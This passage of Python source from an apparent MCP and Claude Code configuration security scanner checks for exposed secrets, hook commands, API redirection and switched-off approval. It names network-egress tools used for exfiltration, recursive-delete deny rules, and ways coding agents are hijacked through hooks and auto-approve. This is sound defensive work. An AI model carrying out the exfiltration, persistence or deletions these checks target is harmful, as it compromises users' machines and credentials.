        tail = [word for word in after if not word.startswith("-")]
        if pair in _RUNNERS_WITH_TARGET and tail:
            tail = tail[1:]
    if not tail:
        return True
    inner = tail[0].rsplit("/", 1)[-1].lower()
    if len(tail) == 1:
        return inner in _BROAD_COMMANDS
    return (inner, tail[1].lower()) in _BROAD_SUBCOMMANDS


def _guards_recursive_delete(perms: dict, hooks: object) -> bool:
    """True when this file denies recursive deletes or hooks shell commands."""
    deny = perms.get("deny")
    if isinstance(deny, list) and any(
        isinstance(rule, str) and _RECURSIVE_DELETE_RE.search(rule) for rule in deny
    ):
        return True
    if not isinstance(hooks, dict):
        return False
    for entry in hooks.get("PreToolUse") or []:
        if not isinstance(entry, dict):
            continue
        matcher = str(entry.get("matcher", "") or "")
        shell_matcher = matcher in ("", "*") or re.search(
            r"\b(Bash|PowerShell)\b", matcher
        )
        if shell_matcher and entry.get("hooks"):
            return True
    return False


class ConfigHygieneAnalyzer(BaseAnalyzer):
    """Grade MCP config files for filesystem security hygiene.

    Checks performed per server (via its ``config_path``):

    - **CFHYG-001**: config file is world-readable (POSIX o+r).
    - **CFHYG-002**: any ancestor directory up to ``$HOME`` is world-writable.
    - **CFHYG-003**: config file stores a plaintext secret inline.
    - **CFHYG-004**: config file uses env-var references for all credentials
      (positive signal — reinforces correct behaviour).
    - **CFHYG-005**: any Claude client config file contains a non-empty
      ``hooks`` section (CVE-2025-59536 — shell-command injection).
    - **CFHYG-006**: server env sets ``ANTHROPIC_BASE_URL`` to a non-Anthropic
      domain (CVE-2026-21852 — API traffic exfiltration).
    - **CFHYG-007**: a project settings file's own ``env`` block points an API
      endpoint or proxy variable at a non-first-party host (``analyze_config``).
    - **TRUST-003 / TRUST-008**: repo-planted auto-run files of VS Code and of
      Gemini CLI, Codex and Claude Code (``analyze_autoexec_file``).
    - **HOOK-001**: a hook command contains network-egress primitives (curl,
      wget, nc, socat, raw HTTP(S) URL, etc.), enabling data exfiltration or
      C2 callback via the agent lifecycle.
    - **HOOK-002**: a hook command references an MCP/agent config file path,
      the CVE-2026-30615 persistence channel (write-to-config-and-survive).

    Permission checks (CFHYG-001, CFHYG-002) are skipped on Windows because
    POSIX ``st_mode`` bits do not represent Windows ACL semantics.
    Windows ACL checking via ``pywin32`` / ``icacls`` is out of scope (TODO).
    """

    @property
    def name(self) -> str:
        return "config_hygiene"

    @property
    def description(self) -> str:
        return (
            "Grade MCP config files for filesystem hygiene: permissions,"
            " directory write-access, and inline vs. env-var secret storage"
        )

    def analyze(self, server: ServerConfig) -> list[Finding]:
        """Inspect *server*'s config file for hygiene issues.

        Args:
            server: The MCP server configuration to analyze.

        Returns:
            List of hygiene findings.  Empty list when no issues are detected
            or the config file cannot be accessed.
        """
        findings: list[Finding] = []

        config_path = server.config_path.resolve()

        try:
            file_stat = config_path.stat()
        except FileNotFoundError:
            logger.debug("config_hygiene: config file not found: %s", config_path)
            return []
        except PermissionError:
            logger.debug(
                "config_hygiene: permission denied reading stat for: %s", config_path
            )
            return []

        if os.name == "nt":
            # TODO: implement Windows ACL checking via pywin32 or icacls.
            logger.debug(
                "config_hygiene: POSIX permission checks skipped on Windows for %s",
                config_path,
            )
        else:
            findings.extend(self._check_world_readable(server, config_path, file_stat))
            findings.extend(self._check_world_writable_parent(server, config_path))

        findings.extend(self._check_inline_secrets(server, config_path))
        findings.extend(self._check_anthropic_base_url(server))

        return findings

    # ── private helpers ──────────────────────────────────────────────────────

    def _check_world_readable(
        self,
        server: ServerConfig,
        config_path: Path,
        file_stat: os.stat_result,
    ) -> list[Finding]:
        """CFHYG-001 — config file is world-readable (o+r bit set)."""
        if not (file_stat.st_mode & stat_module.S_IROTH):
            return []
        return [
            Finding(
                id="CFHYG-001",
                severity=Severity.HIGH,
                analyzer=self.name,
                client=server.client,
                server=server.name,
                title="Config file is world-readable",
                description=(
                    "The MCP config file has world-readable permissions. "
                    "Any process running on this machine — including supply-chain "
                    "malware — can read credentials embedded in the file. "
                    "The Bitwarden npm incident (2026-04-22) explicitly targeted "
                    "these files as its primary credential-cache."
                ),
                evidence=f"Config file permissions: {oct(file_stat.st_mode)}",
                remediation=f"Run: chmod 600 {config_path}",
                cwe="CWE-732",
                owasp_mcp_top_10=["MCP01"],
            )
        ]

    def _check_world_writable_parent(
        self,
        server: ServerConfig,
        config_path: Path,
    ) -> list[Finding]:
        """CFHYG-002 — any ancestor directory up to $HOME is world-writable."""
        try:
            home = Path.home()
        except RuntimeError:
            home = None

        candidate = config_path.parent
        while True:
            try:
                dir_stat = candidate.stat()
            except (PermissionError, OSError):
                break

            if dir_stat.st_mode & stat_module.S_IWOTH:
                return [
                    Finding(
                        id="CFHYG-002",
                        severity=Severity.HIGH,
                        analyzer=self.name,
                        client=server.client,
                        server=server.name,
                        title="Config file is in a world-writable directory",
                        description=(
                            f"Parent directory {candidate} is world-writable. "
                            "Any process on this machine can replace the config "
                            "file — a filesystem-level rug-pull. /tmp is the "
                            "canonical case; supply-chain malware actively "
                            "exploits this to inject malicious server definitions "
                            "(Bitwarden incident, 2026-04-22)."
                        ),
                        evidence=f"Parent directory {candidate} is world-writable",
                        remediation=(
                            "Move the config file to a directory with restricted"
                            " write permissions (e.g., your home directory at"
                            f" mode 700): {home or '~'}"
                        ),
                        cwe="CWE-732",
                        owasp_mcp_top_10=["MCP01", "MCP09"],
                    )
                ]

            # Stop climbing once we reach home or the filesystem root.
            if home is not None and candidate == home:
                break
            parent = candidate.parent
            if parent == candidate:
                # Filesystem root — stop.
                break
            candidate = parent

        return []

    def _check_inline_secrets(
        self,
        server: ServerConfig,
        config_path: Path,
    ) -> list[Finding]:
        """CFHYG-003 / CFHYG-004 — inline secrets vs. env-var references."""
        if not server.env:
            # No env entries — nothing to grade.
            return []

        has_secret = False
        all_env_refs = True  # tracks whether every *non-empty* value is a ref

        for value in server.env.values():
            if not value:
                # Empty string — neutral; don't count against env-ref score.
                continue
            matched_secret = any(pat.search(value) for _, pat, _ in SECRET_PATTERNS)
            if matched_secret:
                has_secret = True
                all_env_refs = False
                break
            if not _looks_like_env_ref(value):
                all_env_refs = False

        if has_secret:
            return [
                Finding(
                    id="CFHYG-003",
                    severity=Severity.HIGH,
                    analyzer=self.name,
                    client=server.client,
                    server=server.name,
                    title="Config file stores a plaintext secret inline",
                    description=(
                        "Config file stores a plaintext secret inline — this "
                        "file is a high-value target for supply-chain malware "
                        "(Bitwarden incident 2026-04-22). Any process on this "
                        "machine with read access to the config file can harvest "
                        "the credential without further privilege escalation."
                    ),
                    evidence=(
                        f"One or more env values in server '{server.name}' match"
                        " a known secret pattern"
                    ),
                    remediation=(
                        "Replace inline secrets with environment variable "
                        "references (e.g., ${MY_API_KEY}) and export the actual "
                        "value from a credential manager or shell profile."
                    ),
                    cwe="CWE-312",
                    owasp_mcp_top_10=["MCP01"],
                )
            ]

        if all_env_refs:
            return [
                Finding(
                    id="CFHYG-004",
                    severity=Severity.INFO,
                    analyzer=self.name,
                    client=server.client,
                    server=server.name,
                    title=(
                        "Config uses environment variable references for"
                        " credentials (good practice)"
                    ),
                    description=(
                        "No plaintext secrets found; credentials appear to be "
                        "passed via environment variable references."
                    ),
                    evidence=(
                        f"All env values for server '{server.name}' use"
                        " env-var reference syntax (e.g., ${{VAR}}, $VAR,"
                        " %(VAR)s)"
                    ),
                    remediation="No action required — this is the recommended pattern.",
                    cwe=None,
                    owasp_mcp_top_10=["MCP01"],
                )
            ]

        return []

    # ── Hook helpers ──────────────────────────────────────────────────────────

    @staticmethod
    def _is_claude_code_config(config_path: Path) -> bool:
        """Return True when the config file is a Claude Code hooks-capable config.

        Hooks are a Claude Code feature, not Claude Desktop.  Only three file
        locations can contain a ``hooks`` section:

        - ``~/.claude.json`` (user-global)
        - ``.claude/settings.json`` (project-level)
        - ``.claude/settings.local.json`` (project-level)
        """
        return _permissions.is_claude_code_settings_file(config_path)

    @staticmethod
    def _extract_hook_entries(hooks: dict) -> list[tuple[str, str]]:
        """Flatten a Claude Code ``hooks`` dict into ``(event, command)`` pairs.

        The hooks dict looks like:
        ``{"PreToolUse": [{"hooks": [{"type": "command", "command": "..."}]}]}``
        """
        entries: list[tuple[str, str]] = []
        if not isinstance(hooks, dict):
            return entries
        for event, hook_groups in hooks.items():
            if not isinstance(hook_groups, list):
                continue
            for group in hook_groups:
                if not isinstance(group, dict):
                    continue
                for hook in group.get("hooks") or []:
                    if isinstance(hook, dict) and hook.get("type") == "command":
                        cmd = hook.get("command")
                        if isinstance(cmd, str) and cmd.strip():
                            entries.append((str(event), cmd))
        return entries

    @staticmethod
    def _extract_hook_commands(hooks: dict) -> list[str]:
        """Flatten a Claude Code ``hooks`` dict into a list of command strings.

        Returns:
            All ``"command"`` values found at any nesting depth.
        """
        return [
            cmd for _event, cmd in ConfigHygieneAnalyzer._extract_hook_entries(hooks)
        ]

    def _hook_003(self, hooks: dict, config_path: Path, client: str) -> list[Finding]:
        """HOOK-003: a project hook runs a file the repository ships (STORY-0138).

        Called only for project and local settings (the caller checks the
        scope); one finding per file, naming the first hook and the count.
        """
        hits: list[tuple[str, str, str]] = []
        for event, cmd in self._extract_hook_entries(hooks):
            path = find_project_script(normalize_for_detection(cmd))
            if path is not None:
                hits.append((event, cmd, path))
        if not hits:
            return []
        event, cmd, path = hits[0]
        more = f" (+{len(hits) - 1} more hook command(s))" if len(hits) > 1 else ""
        return [
            Finding(
                id="HOOK-003",
                severity=Severity.LOW,
                analyzer=self.name,
                client=client,
                server="(hook)",
                title="Project hook runs a script shipped in the repository",
                description=(
                    f"A {event} hook in '{config_path.name}' runs a file inside"
                    " the project. Claude Code runs a settings hook's command on"
                    " your machine when the event fires (SessionStart runs when"
                    " the session opens), and the script it points at is part of"
                    " the same repository, so whoever can commit to the"
                    " repository chooses what runs. Most project hooks are a"
                    " team's own formatter or guard script, and this finding does"
                    " not say this one is harmful; it names the script so you can"
                    " review it before trusting the repo. The testmetest /"
                    " Miasma-family worms use the same shape for a committed"
                    " loader (`.github/init.js`)."
                ),
                evidence=(
                    f"{event}: "
                    + redact_command_text(cmd)[:160]
                    + f" | runs project file: {redact_command_text(path)[:120]}"
                    + more
                ),
                remediation=(
                    "Review this script, and anything it calls, before trusting"
                    " the repo, and check git history for who added the hook."
                    " Remove the hook if you did not expect it. mcp-audit does"
                    " not modify this file."
                ),
                cwe="CWE-829",
                owasp_mcp_top_10=["MCP05", "MCP09"],
            )
        ]

    def _check_hook_commands(
        self,
        hooks: dict,
        config_path: Path,
        client: str,
        scope: str | None = None,
    ) -> list[Finding]:
        """HOOK-001..003: inspect hook command strings for risky patterns.

        Args:
            hooks: The ``hooks`` dict from the parsed config file.
            config_path: Filesystem path to the config file (for evidence context).
            client: Client name from the discovered config.
            scope: The settings layer (:func:`permissions.settings_scope`);
                HOOK-003 runs only for ``"project"`` and ``"local"``.

        Returns:
            List of HOOK-001/002/003 findings.
        """
        commands = self._extract_hook_commands(hooks)
        findings: list[Finding] = []
        if scope in ("project", "local"):
            findings.extend(self._hook_003(hooks, config_path, client))
        seen_ids: set[str] = set()

        for cmd in commands:
            # Match against a Unicode-normalized copy so homoglyph/compat
            # obfuscation (e.g. a Cherokee "curl") cannot evade the egress
            # primitives; evidence below always shows the original command.
            norm_cmd = normalize_for_detection(cmd)
            # HOOK-001: network egress
            m = _HOOK_NETWORK_RE.search(norm_cmd)
            if m and "HOOK-001" not in seen_ids:
                seen_ids.add("HOOK-001")
                findings.append(
                    Finding(
                        id="HOOK-001",
                        severity=Severity.HIGH,
                        analyzer=self.name,
                        client=client,
                        server="(hook)",
                        title="Hook command contains network-egress instruction",
                        description=(
                            f"A hook command in '{config_path.name}' contains a"
                            " network-egress primitive (curl, wget, nc, socat, HTTP"
                            " URL, etc.). Claude Code executes hook commands during"
                            " its lifecycle (preToolUse, postToolUse, stop, etc.)."
                            " A hook that calls out to the network can exfiltrate"
                            " conversation content, credentials, or tool outputs to"
                            " an attacker-controlled server."
                        ),
                        evidence=f"Command: {cmd[:120]!r}",
                        remediation=(
                            "Remove the network-egress instruction from the hook"
                            " command. Hook commands should be limited to local"
                            " operations. Review all hooks for commands you did not"
                            " add intentionally."
                        ),
                        cwe="CWE-78",
                        owasp_mcp_top_10=["MCP05", "MCP07"],
                    )
                )

            # HOOK-002: writes to / references agent config files
            m2 = _HOOK_CONFIG_WRITE_RE.search(norm_cmd)
            if m2 and "HOOK-002" not in seen_ids:
                seen_ids.add("HOOK-002")
                findings.append(
                    Finding(
                        id="HOOK-002",
                        severity=Severity.HIGH,
                        analyzer=self.name,
                        client=client,
                        server="(hook)",
                        title="Hook command references agent config file path",
                        description=(
                            f"A hook command in '{config_path.name}' references"
                            " an MCP or agent config file path. This matches the"
                            " CVE-2026-30615 persistence pattern: a hook that"
                            " modifies another agent config file can inject new"
                            " servers or hooks that survive configuration resets,"
                            " establishing a persistent backdoor."
                        ),
                        evidence=f"Command: {cmd[:120]!r}",
                        remediation=(
                            "Remove the hook command that references agent config"
                            " file paths. Hook commands should never modify other"
                            " config files. Review all hooks for commands you did"
                            " not add intentionally."
                        ),
                        cwe="CWE-78",
                        cve=["CVE-2026-30615"],
                        owasp_mcp_top_10=["MCP05", "MCP07"],
                    )
                )

        return findings

    def analyze_config(
        self,
        raw: dict,
        config_path: Path,
        client: str,
    ) -> list[Finding]:
        """Config-level hygiene checks that run even when no servers are configured.

        Called once per config file by the scanner pipeline, independent of how
        many (if any) MCP servers the file defines.

        Currently covers:

        - **CFHYG-005**: non-empty ``hooks`` section in any Claude client config
          file (CVE-2025-59536 — shell-command injection via config file write).
          Covers ``~/.claude.json``, ``.claude/settings.json``, and
          ``.claude/settings.local.json``.
        - **HOOK-001**: hook command contains network-egress primitives.
        - **HOOK-002**: hook command references an agent config file path
          (CVE-2026-30615 persistence channel).
        - **HOOK-003**: a hook in project or local settings runs a file the
          repository ships (:mod:`mcp_audit.analyzers.hook_scripts`, STORY-0138).
        - **HARNESS-001..007**: settings that switch Claude Code's human approval
          off (bypassPermissions default mode, auto-approved project MCP servers,
          skipped bypass confirmation, blanket shell allow rules), and the
          named-server approval inventory (HARNESS-007, INFO).
        - **CFHYG-007**: a project-scoped ``.claude/settings*.json`` whose
          top-level ``env`` block points an API endpoint or proxy variable at a
          non-first-party host (the CVE-2026-21852 shape).
        - **PERM-001..006**: permission rules that don't do what they say
          (:mod:`mcp_audit.analyzers.permissions`, STORY-0092).

        SANDBOX-001..005 (:mod:`mcp_audit.analyzers.sandbox`, STORY-0093) run
        on the same files in pipeline step 0b, not here.

        Args:
            raw: The parsed JSON dict for the config file.
            config_path: Filesystem path to the config file.
            client: Client name from the discovered config (e.g. ``"claude-code"``).

        Returns:
            List of config-level findings.  Empty when no issues are detected.
        """
        if client == AGENT_DEFINITION_CLIENT:
            return self.analyze_agent_definition(
                raw, config_path, client, agent_definition_scope(config_path)
            )

        findings: list[Finding] = []
        if not self._is_claude_code_config(config_path):
            return findings

        # PERM-001..006 (STORY-0092): rules that don't do what they say.
        findings.extend(
            _permissions.analyze_permission_rules(
                raw,
                config_path,
                client,
                analyzer=self.name,
                is_broad_allow_rule=_is_broad_allow_rule,
            )
        )

        findings.extend(self._check_harness_posture(raw, config_path, client))
        findings.extend(self._check_settings_env_redirect(raw, config_path, client))

        hooks = raw.get("hooks")
        if not hooks:
            return findings

        # CFHYG-005: presence of any hooks section
        findings.append(
            Finding(
                id="CFHYG-005",
                severity=Severity.MEDIUM,
                analyzer=self.name,
                client=client,
                server="(config-level)",
                title="Claude Code hooks section detected in config",
                description=(
                    f"The config file '{config_path.name}' contains a non-empty"
                    " 'hooks' section. Claude Code executes hooks as shell"
                    " commands during its lifecycle (pre-tool, post-tool,"
                    " etc.). A threat actor with write access to this file"
                    " can inject arbitrary commands that run with your user"
                    " privileges during normal Claude Code operation."
                    " (CVE-2025-59536, Check Point Research)"
                ),
                evidence=(
                    f"Config file {config_path} contains a non-empty 'hooks' section"
                ),
                remediation=(
                    f"Review the 'hooks' section in {config_path.name}. Remove any"
                    " hooks you did not intentionally add. Restrict write"
                    f" access to the file: chmod 600 {config_path}"
                ),
                cwe="CWE-78",
                cve=["CVE-2025-59536"],
                owasp_mcp_top_10=["MCP01", "MCP07"],
            )
        )

        # HOOK-001/002/003: inspect individual hook commands for risky patterns
        findings.extend(
            self._check_hook_commands(
                hooks, config_path, client, _permissions.settings_scope(config_path)
            )
        )
        return findings

    def analyze_agent_definition(
        self,
        raw: dict,
        config_path: Path,
        client: str,
        scope: str,
    ) -> list[Finding]:
        """AGENT-001..004 plus HOOK-001/002 for one subagent definition (STORY-0094).

        The single place both entry points combine the two: pipeline step 0
        (via :meth:`analyze_config`, client ``claude-code-agent``) and the
        agent-file scanner (``agent-files scan``). A subagent's frontmatter
        ``hooks`` use the settings-file schema, so its commands go through the
        same HOOK-001/002 checks; AGENT-003 replaces CFHYG-005 for this file
        type (CFHYG-005 never fires on an agent file).

        Args:
            raw: The definition record from ``parse_config`` (every reading of
                the frontmatter), or one plain frontmatter mapping.
            config_path: The agent definition file.
            client: Client name for the findings.
            scope: ``"project"`` or ``"user"``.

        Returns:
            Findings with ``finding_path`` set to *config_path*; hook commands
            from every reading are checked, and credential-shaped text in any
            finding is redacted.
        """
        definition = AgentFrontmatter.from_record(raw)
        if definition is None:
            if not isinstance(raw, dict) or not raw:
                return []
            definition = AgentFrontmatter.from_mapping(raw)
        findings = analyze_agent_definition(definition, config_path, scope, client)
        hook_findings: list[Finding] = []
        for reading in definition.readings:
            hooks = reading.get("hooks")
            if isinstance(hooks, dict):
                hook_findings += self._check_hook_commands(hooks, config_path, client)
        findings += finalize_findings(hook_findings)
        for finding in findings:
            finding.finding_path = str(config_path)
        return findings

    # ── Harness posture (STORY-0079) ──────────────────────────────────────────

    @staticmethod
    def _settings_scope(config_path: Path) -> str:
        """Describe which Claude Code settings layer *config_path* is."""
        if config_path.name == ".claude.json":
            return "the global Claude Code config"
        if config_path.name == "settings.local.json":
            return "local project settings (.claude/settings.local.json)"
        try:
            if (
                config_path.resolve()
                == (Path.home() / ".claude" / "settings.json").resolve()
            ):
                return (
                    "user settings (~/.claude/settings.json), which apply to"
                    " every project"
                )
        except OSError:
            pass
        return (
            "committed project settings (.claude/settings.json), which reach"
            " everyone who clones the repository"
        )

    def _harness_finding(
        self,
        *,
        finding_id: str,
        severity: Severity,
        client: str,
        config_path: Path,
        title: str,
        description: str,
        evidence: str,
        remediation: str,
        cwe: str,
        owasp: list[str],
    ) -> Finding:
        return Finding(
            id=finding_id,
            severity=severity,
            analyzer=self.name,
            client=client,
            server="(config-level)",
            title=title,
            description=description,
            evidence=evidence,
            remediation=remediation,
            cwe=cwe,
            owasp_mcp_top_10=owasp,
            finding_path=str(config_path),
        )

    def _harness_001(
        self, config_path: Path, client: str, scope_cap: str, basis: str
    ) -> Finding:
        """HARNESS-001: ``permissions.defaultMode`` is ``bypassPermissions``.

        HIGH in user settings and the global config.  MEDIUM in project and
        local settings (STORY-0108): the settings reference, under
        ``permissions.defaultMode``, says "``auto`` and ``bypassPermissions``
        don't take effect from project or local settings, so set them in
        ``~/.claude/settings.json`` instead. Before v2.1.257,
        ``bypassPermissions`` took effect from any file."  The installed
        Claude Code version is not read, so the finding stays: an older
        install still starts every session in bypass mode from this file.
        The layer comes from :func:`permissions.settings_scope`, the same
        test PERM-004 uses for the same sentence.
        """
        evidence = f"{config_path}: permissions.defaultMode = bypassPermissions"
        remediation = (
            "Remove defaultMode or set it to 'default'. Use bypass mode"
            " only for a single session in an isolated container, and set"
            ' permissions.disableBypassPermissionsMode to "disable" in'
            " managed or user settings to prevent it elsewhere."
        )
        if _permissions.settings_scope(config_path) in ("project", "local"):
            return self._harness_finding(
                finding_id="HARNESS-001",
                severity=Severity.MEDIUM,
                client=client,
                config_path=config_path,
                title=(
                    "Project settings ask for bypassPermissions (ignored by"
                    " Claude Code 2.1.257 and later)"
                ),
                description=(
                    f"{scope_cap} set permissions.defaultMode to"
                    " 'bypassPermissions'. Claude Code 2.1.257 and later ignore"
                    " this value in project and local settings and start the"
                    " session with prompts on (settings reference: 'auto and"
                    " bypassPermissions don't take effect from project or local"
                    " settings'). Older versions honour it from any file: every"
                    " session in this project then starts with tool-call approval"
                    " skipped, so an instruction injected through a file, a tool"
                    " result or an MCP server runs without a person seeing it."
                    " mcp-audit does not read which version is installed." + basis
                ),
                evidence=evidence,
                remediation=(
                    "Remove defaultMode from this file or set it to 'default', and"
                    " update Claude Code to 2.1.257 or later. " + remediation
                ),
                cwe="CWE-862",
                owasp=["MCP02", "MCP07"],
            )
        return self._harness_finding(
            finding_id="HARNESS-001",
            severity=Severity.HIGH,
            client=client,
            config_path=config_path,
            title="Claude Code sessions start with permission prompts skipped",
            description=(
                f"{scope_cap} set permissions.defaultMode to"
                " 'bypassPermissions'. Every session starts with tool-call"
                " approval skipped, including writes to .git and .claude, so"
                " an instruction injected through a file, a tool result or an"
                " MCP server runs without a person seeing it." + basis
            ),
            evidence=evidence,
            remediation=remediation,
            cwe="CWE-862",
            owasp=["MCP02", "MCP07"],
        )

    def _check_harness_posture(
        self,
        raw: dict,
        config_path: Path,
        client: str,
    ) -> list[Finding]:
        """HARNESS-001..006 — approval switched off, and what replaced it.

        Evaluated per file.  Claude Code merges user, project, local and managed
        settings with precedence; that merge is not modelled here (GAPS.md), so a
        finding says what this file asks for, not the effective setting.  The one
        in-file interaction honoured: ``permissions.disableBypassPermissionsMode:
        "disable"`` in the same file suppresses HARNESS-001 and HARNESS-003.

        Args:
            raw: Parsed JSON of a Claude Code settings or global config file.
            config_path: Path to that file.
            client: Client name from discovery.

        Returns:
            Zero or more HARNESS-* findings.
        """
        findings: list[Finding] = []
        if not isinstance(raw, dict):
            return findings
        perms = raw.get("permissions")
        perms = perms if isinstance(perms, dict) else {}
        bypass_disabled = perms.get("disableBypassPermissionsMode") == "disable"
        scope = self._settings_scope(config_path)
        scope_cap = scope[:1].upper() + scope[1:]
        basis = (
            " HarnessSecurity-Bench (arXiv 2610.07639) measured attack success on"
            " coding agents rising from 29.2% to 95.6% with auto-approve on."
        )

        if perms.get("defaultMode") == "bypassPermissions" and not bypass_disabled:
            findings.append(self._harness_001(config_path, client, scope_cap, basis))

        if raw.get("enableAllProjectMcpServers") is True:
            findings.append(
                self._harness_finding(
                    finding_id="HARNESS-002",
                    severity=Severity.HIGH,
                    client=client,
                    config_path=config_path,
                    title="Every project .mcp.json server is approved without a prompt",
                    description=(
                        f"{scope_cap} set enableAllProjectMcpServers to true."
                        " Claude Code then starts every MCP server declared in a"
                        " repository's .mcp.json without asking, so a cloned"
                        " repository can launch servers it chose. Compare TRUST-001,"
                        " which flags those project-scoped servers."
                    ),
                    evidence=f"{config_path}: enableAllProjectMcpServers = true",
                    remediation=(
                        "Remove enableAllProjectMcpServers. Approve servers you trust"
                        " by name with enabledMcpjsonServers, and reject the rest with"
                        " disabledMcpjsonServers."
                    ),
                    cwe="CWE-862",
                    owasp=["MCP09", "MCP07"],
                )
            )

        if raw.get("skipDangerousModePermissionPrompt") is True and not bypass_disabled:
            findings.append(
                self._harness_finding(
                    finding_id="HARNESS-003",
                    severity=Severity.MEDIUM,
                    client=client,
                    config_path=config_path,
                    title="Confirmation before bypass mode is switched off",
                    description=(
                        f"{scope_cap} set skipDangerousModePermissionPrompt"
                        " to true, which removes the confirmation dialog shown before"
                        " a session enters bypassPermissions mode."
                    ),
                    evidence=f"{config_path}: skipDangerousModePermissionPrompt = true",
                    remediation=(
                        "Remove skipDangerousModePermissionPrompt so entering bypass"
                        " mode stays a deliberate, confirmed step."
                    ),
                    cwe="CWE-862",
                    owasp=["MCP02", "MCP07"],
                )
            )

        allow = perms.get("allow")
        allow = allow if isinstance(allow, list) else []
        blanket = sorted(
            {
                rule.strip()
                for rule in allow
                if isinstance(rule, str)
                and rule.strip() in {"Bash", "Bash(*)", "PowerShell", "PowerShell(*)"}
            }
        )
        if blanket:
            findings.append(
                self._harness_finding(
                    finding_id="HARNESS-004",
                    severity=Severity.HIGH,
                    client=client,
                    config_path=config_path,
                    title="Every shell command is pre-approved",
                    description=(
                        f"{scope_cap} allow-list {', '.join(blanket)}, which"
                        " matches every shell command, so Claude Code runs any command"
                        " without asking. It is auto-approve for the shell." + basis
                    ),
                    evidence=(
                        f"{config_path}: permissions.allow contains "
                        f"{', '.join(blanket)}"
                    ),
                    remediation=(
                        "Replace the blanket rule with specific ones, such as"
                        " 'Bash(npm run test *)'. Command allowlists cut attack success"
                        " at a small cost in the same benchmark."
                    ),
                    cwe="CWE-862",
                    owasp=["MCP02", "MCP05"],
                )
            )

        broad = sorted({rule.strip() for rule in allow if _is_broad_allow_rule(rule)})
        if broad:
            findings.append(
                self._harness_finding(
                    finding_id="HARNESS-005",
                    severity=Severity.MEDIUM,
                    client=client,
                    config_path=config_path,
                    title="Allow rules pre-approve commands that can write or reach "
                    "the network",
                    description=(
                        f"{scope_cap} allow-list {', '.join(broad)}. Each rule"
                        " approves every argument to a command whose arguments alone"
                        " can write files, run code or reach the network (an"
                        " interpreter, a network tool, a cloud or GitHub CLI, a"
                        " package or environment runner, a PowerShell cmdlet that"
                        " runs code, rm, or git push), so it carries much of"
                        " HARNESS-004's risk for that command."
                    ),
                    evidence=(
                        f"{config_path}: permissions.allow contains {', '.join(broad)}"
                    ),
                    remediation=(
                        "Narrow each rule to the subcommands you need, such as"
                        " 'Bash(gh pr view:*)' instead of 'Bash(gh:*)', and add deny"
                        " rules for the writes you never want approved. For an"
                        " environment runner (devbox run, docker exec, uv run, …),"
                        " name the inner command too, one rule per command, such as"
                        " 'Bash(devbox run npm test)'."
                    ),
                    cwe="CWE-862",
                    owasp=["MCP02", "MCP05"],
                )
            )

        approval_off = (
            perms.get("defaultMode") == "bypassPermissions" and not bypass_disabled
        ) or (
            raw.get("skipDangerousModePermissionPrompt") is True and not bypass_disabled
        )
        if approval_off and not _guards_recursive_delete(perms, raw.get("hooks")):
            findings.append(
                self._harness_finding(
                    finding_id="HARNESS-006",
                    severity=Severity.MEDIUM,
                    client=client,
                    config_path=config_path,
                    title="Approval is off and nothing guards recursive deletes",
                    description=(
                        f"{scope_cap} turns approval prompts off (bypassPermissions or"
                        " skipDangerousModePermissionPrompt) but has no deny rule for"
                        " recursive deletes and no PreToolUse hook on shell commands."
                        " With approval off, those are the only things between a bad"
                        " command and your files. Only this file is checked; a guard"
                        " in another settings file isn't seen."
                    ),
                    evidence=(
                        f"{config_path}: approval off; no permissions.deny rule"
                        " matching rm -r/-rf, Remove-Item -Recurse, rd /s or rmdir /s;"
                        " no PreToolUse hook matching Bash"
                    ),
                    remediation=(
                        "Add deny rules such as 'Bash(rm -rf:*)' and"
                        " 'Bash(rm -r:*)', or a PreToolUse hook that blocks deletes"
                        " outside the project, and run bypass mode only in a"
                        " disposable container."
                    ),
                    cwe="CWE-862",
                    owasp=["MCP02", "MCP05"],
                )
            )

        approved = raw.get("enabledMcpjsonServers")
        named = (
            sorted({s.strip() for s in approved if isinstance(s, str) and s.strip()})
            if isinstance(approved, list)
            else []
        )
        if named:
            shown = _capped_list(named)
            findings.append(
                self._harness_finding(
                    finding_id="HARNESS-007",
                    severity=Severity.INFO,
                    client=client,
                    config_path=config_path,
                    title="Named .mcp.json servers are approved without a prompt",
                    description=(
                        f"{scope_cap} list {len(named)} server name(s) in"
                        " enabledMcpjsonServers. Claude Code connects a project"
                        " .mcp.json server with one of these names without asking,"
                        " once the folder is trusted. Claude Code writes this key to"
                        " .claude/settings.local.json when you approve a server, so"
                        " there it is usually your own choice; in a committed"
                        " .claude/settings.json it is the repository's choice, and in"
                        " user settings it applies to every project. Compare"
                        " HARNESS-002, which approves every server."
                    ),
                    evidence=f"{config_path}: enabledMcpjsonServers = {shown}",
                    remediation=(
                        "Keep approvals in your own .claude/settings.local.json or user"
                        " settings, and review each named server's command in"
                        " .mcp.json before trusting the folder."
                    ),
                    cwe="CWE-862",
                    owasp=["MCP09", "MCP07"],
                )
            )

        return findings

    # ── CFHYG-007: settings env that redirects API traffic (STORY-0090) ─────

    @staticmethod
    def _is_project_claude_settings(config_path: Path) -> bool:
        """True for ``.claude/settings.json`` / ``settings.local.json`` in a project.

        The user-level ``~/.claude/`` directory is excluded: an endpoint or
        proxy set there is the user's own choice (an LLM gateway is a common,
        legitimate setup), not one a cloned repository made for them.
        """
        if config_path.name not in ("settings.json", "settings.local.json"):
            return False
        if config_path.parent.name != ".claude":
            return False
        try:
            return config_path.parent.resolve() != (Path.home() / ".claude").resolve()
        except (OSError, RuntimeError):
            return True

    def _check_settings_env_redirect(
        self,
        raw: dict,
        config_path: Path,
        client: str,
    ) -> list[Finding]:
        """CFHYG-007 — a project settings ``env`` block redirects API traffic.

        CVE-2026-21852 (Check Point Research): a repository's
        ``.claude/settings.json`` set ``ANTHROPIC_BASE_URL`` in its ``env``
        block, and Claude Code sent the user's API key to that host.  Since
        the fix (2025-12-28) project ``env`` values wait for the trust
        dialog, but they still apply once the folder is trusted, and at
        startup in ``claude -p``, which never shows the dialog
        (code.claude.com/docs/en/settings-reference#env).  CFHYG-006, which
        reads a *server's* ``env``, is unchanged; this is the settings
        file's own top-level block.

        Args:
            raw: Parsed settings JSON.
            config_path: Path to the settings file.
            client: Client name from discovery.

        Returns:
            One HIGH finding per redirecting variable; empty for user-level
            settings or when nothing redirects.
        """
        if not self._is_project_claude_settings(config_path):
            return []
        env = raw.get("env")
        if not isinstance(env, dict):
            return []
        findings: list[Finding] = []
        for name, host in _redirecting_env_vars(env):
            proxy = name.endswith("_PROXY")
            what = (
                "routes Claude Code's network traffic, including its API requests,"
                " through a proxy at"
                if proxy
                else "sends API requests, which carry the API key and the"
                " conversation, to"
            )
            findings.append(
                Finding(
